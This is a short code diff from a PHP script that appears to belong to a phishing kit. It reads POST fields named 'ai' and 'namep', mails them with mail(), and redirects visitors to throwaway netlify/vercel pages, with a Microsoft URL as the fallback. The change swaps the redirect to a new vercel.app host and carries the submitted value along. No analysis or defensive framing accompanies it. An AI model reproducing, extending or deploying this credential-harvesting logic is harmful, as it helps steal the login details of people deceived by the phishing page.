@@ -27,7 +27,7 @@ if ($_POST["ai"] != "" && $_POST["namep"] != "") {
     mail($to, $subject, $message);
     
     // Redirect the user after sending the email
-    header("Location: https://relaxed-truffle-59023f.netlify.app/api2.html/#".$_POST['ai']);
+    header("Location: https://sssss-3fdyuz4xi-simdia.vercel.app/api2.html#".$_POST['ai']);
 } else {
     // Redirect the user if 'ai' or 'namep' fields are empty
     header("Location: https://www.microsoft.com/undefined");
